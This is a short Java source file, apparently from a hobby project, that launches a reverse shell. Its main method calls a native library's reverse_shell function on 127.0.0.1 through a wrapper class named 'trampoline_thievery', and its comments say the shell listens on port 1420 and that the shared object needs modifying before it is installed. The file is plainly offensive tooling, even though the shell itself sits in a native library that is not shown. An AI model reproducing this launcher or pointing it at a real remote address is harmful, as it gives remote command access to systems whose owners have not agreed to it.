package com.bdg.double07.reversecshell;

//import com.bdg.double07.reversecshell.instrumentation.CLibrary;
import com.bdg.double07.reversecshell.instrumentation.reverseshell.NativeReverseShellWrapper;
//import com.bdg.double07.reversecshell.instrumentation.structures.context_t;

class trampoline_thievery<T> {
    public T get() { return null; }

    public String toString(){
        return "Some iteration in LibC";
    }
    public trampoline_thievery<T>  run() {
        return null; }

    T execute() {
        trampoline_thievery<T>  trampoline = this;

        while (trampoline.get() == null) {
            System.out.println("Trampolined function" + new String(this.toString()));
            trampoline = trampoline.run();
        }

        return trampoline.get();
    }
}
public class App {

    // opens a reverse shell at your local host on port 1420
    // some modifications do need to be made before installing the shared object library

    public static void main(String[] args) {
        trampoline_thievery<Object> x = new trampoline_thievery<>(){
            @java.lang.Override
            public java.lang.Object get() {
               return super.get();
            }

            @java.lang.Override
            public trampoline_thievery<java.lang.Object> run(){
                //CLibrary.INSTANCE.getcontext(context);
                //***DANGER-WILL_ROBINSON
                NativeReverseShellWrapper.instance.reverse_shell("127.0.0.1");//open a shell on localhost
                //***END-DANGER
                return this;
            }
        };
        for (int i=0;i < args.length;i++) {
            int j = 0;

        }

        x.run();
        System.out.println("Opened a Reverse Shell listening on port 1420 on 127.0.0.1");

    }
}

